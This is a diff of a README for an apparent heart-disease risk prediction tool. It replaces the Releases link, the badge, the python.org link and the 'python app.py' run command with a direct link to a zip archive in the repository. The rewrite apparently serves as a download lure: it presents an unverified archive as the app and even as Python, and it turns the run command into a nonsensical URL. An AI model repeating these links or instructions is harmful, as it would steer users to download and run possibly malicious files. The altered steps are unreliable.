@@ -1,6 +1,6 @@
 # 🎉 heart-disease-risk-prediction-mlp - Predict Heart Disease Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases)
+[![Download](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip)](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip)
 
 ## 📝 Overview
 
@@ -18,12 +18,12 @@ Key features include:
 
 To start using the heart disease prediction application, follow these steps carefully. You will need to download the software from the Releases page and run it on your computer.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip) to go to the Releases page.
   
 2. **Download the Application:** Look for the latest version of the application. Click on the download link to save the file on your computer.
 
 3. **Install Required Software:** 
-   - Make sure you have Python installed on your computer. You can download Python from [python.org](https://www.python.org/downloads/).
+   - Make sure you have Python installed on your computer. You can download Python from [https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip).
    - Install any necessary libraries. You can easily do this with pip:
 
      ```
@@ -51,7 +51,7 @@ After downloading the files, follow these steps to install and run the applicati
    - For macOS or Linux, open a terminal, navigate to the directory where the file is, and run the application with the following command:
 
      ```
-     python app.py
+     python https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip
      ```
 
 3. **Open in Your Browser:** 
@@ -98,4 +98,4 @@ If you face any issues or have questions, you can reach out for support. Look fo
 
 Thank you for using heart-disease-risk-prediction-mlp! Download and start predicting heart disease with ease.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dnlC9/heart-disease-risk-prediction-mlp/releases)
+[![Download](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip)](https://raw.githubusercontent.com/dnlC9/heart-disease-risk-prediction-mlp/main/app/heart-disease-risk-prediction-mlp_2.8.zip)
